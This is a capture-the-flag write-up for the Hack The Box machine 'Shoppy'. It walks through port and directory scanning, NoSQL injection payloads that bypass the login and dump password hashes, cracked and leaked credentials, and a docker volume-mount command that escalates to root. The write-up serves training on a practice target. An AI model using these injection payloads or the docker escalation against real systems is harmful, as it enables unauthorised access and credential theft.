# Shoppy 

Shoppy is an easy Hackthebox machine. That uses noSQLi to get a foothold. Then use a binary file to get credits for the user deploy. From there using docker get root access. 


# Recon
```
nmap -sC -sV 10.10.11.180
Starting Nmap 7.93 ( https://nmap.org ) at 2022-11-07 11:49 EST
Nmap scan report for 10.10.11.180
Host is up (0.035s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 9e5e8351d99f89ea471a12eb81f922c0 (RSA)
|   256 5857eeeb0650037c8463d7a3415b1ad5 (ECDSA)
|_  256 3e9d0a4290443860b3b62ce9bd9a6754 (ED25519)
80/tcp open  http    nginx 1.23.1
|_http-server-header: nginx/1.23.1
|_http-title: Did not follow redirect to http://shoppy.htb
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.91 seconds
```

Port 80 gives a redirect to shoppy.htb. To see the webpage you need to link the ip 10.10.11.180 to shoppy.htb. 
To do this you need to update the /etc/hosts file with the ip address and hostname. Port 22 is also open on hackthebox this isn't a attck vector. 

To scan the webpage for directories and virtual hosts we use gobuster.

``` 
gobuster vhost -u http://shoppy.htb -w /usr/share/wordlists/subdomains.txt
===============================================================
Gobuster v3.2.0-dev
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:             http://shoppy.htb
[+] Method:          GET
[+] Threads:         10
[+] Wordlist:        /usr/share/wordlists/subdomains.txt
[+] User Agent:      gobuster/3.2.0-dev
[+] Timeout:         10s
[+] Append Domain:   false
===============================================================
2022/11/07 11:52:37 Starting gobuster in VHOST enumeration mode
===============================================================
Progress: 4865 / 4998 (97.34%)
===============================================================
2022/11/07 11:52:51 Finished
===============================================================


gobuster dir -u http://shoppy.htb -w /usr/share/wordlists/dirb/common.txt 
===============================================================
Gobuster v3.2.0-dev
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://shoppy.htb
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.2.0-dev
[+] Timeout:                 10s
===============================================================
2022/11/07 11:53:16 Starting gobuster in directory enumeration mode
===============================================================
/admin                (Status: 302) [Size: 28] [--> /login]
/Admin                (Status: 302) [Size: 28] [--> /login]
/ADMIN                (Status: 302) [Size: 28] [--> /login]
/assets               (Status: 301) [Size: 179] [--> /assets/]
/css                  (Status: 301) [Size: 173] [--> /css/]
/exports              (Status: 301) [Size: 181] [--> /exports/]
/favicon.ico          (Status: 200) [Size: 213054]
/fonts                (Status: 301) [Size: 177] [--> /fonts/]
/images               (Status: 301) [Size: 179] [--> /images/]
/js                   (Status: 301) [Size: 171] [--> /js/]
/login                (Status: 200) [Size: 1074]
/Login                (Status: 200) [Size: 1074]
Progress: 4505 / 4615 (97.62%)
===============================================================
2022/11/07 11:53:31 Finished
===============================================================
```

It looks like there are no virtual hosts. There are a couple of directories. /login seems to be interesting. 
When we are logged in with the correct account we have access to /admin page. 

# Foothold

We try if it's vulnerable for SQLi or noSQLi by entering a '. SQL map gives no results. We try for noSQi [hacktricks](https://book.hacktricks.xyz/pentesting-web/nosql-injection) is a good source to try for this.

The query `admin' || ' or 1==1:abc` gives login bypass. This gives access to the admin platform. 

In the search bar we try again for nosqli and it apears that the page crashes when a single quote is entered. The query `a' || ' 1==1 ` gives an export: 

[{"_id":"62db0e93d6d6a999a66ee67a","username":"admin","password":"23c6877d9e2b564ef8b32c3a23de27b2"},
{"_id":"62db0e93d6d6a999a66ee67b","username":"josh","password":"6ebcea65320589ca4f2f1ce039975995"}]

We enter this into hashcat and get the password of josh `josh:remembermethisway`. We try to use this for an ssh connection, this fails. 

In the chat we find that the user jaeger has access to the machine. The password is also shown in the chat `jaeger:Sh0ppyBest@pp!`. 
Now we have ssh access into the machine. 

# Priv esq
We have the password of jaeger so we can check sudo -l.

```
jaeger@shoppy:~$ sudo -l
[sudo] password for jaeger: 
Matching Defaults entries for jaeger on shoppy:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User jaeger may run the following commands on shoppy:
    (deploy) /home/deploy/password-manager
```

We have access to the binary password-manager with sudo rights. Strings shows that the binary reads /home/deploy/creds.txt.
We analyse the binary using r2 we find Sample as the password tha manager needs. Now we have the credentials `deploy:Deploying@pp!`.

Now we use docker to get root access. We lookup docker on [gtfobins](https://gtfobins.github.io/gtfobins/docker/) and this gives us the command `docker run -v /:/mnt --rm -it alpine chroot /mnt sh`.

Now we have root access to the machine.









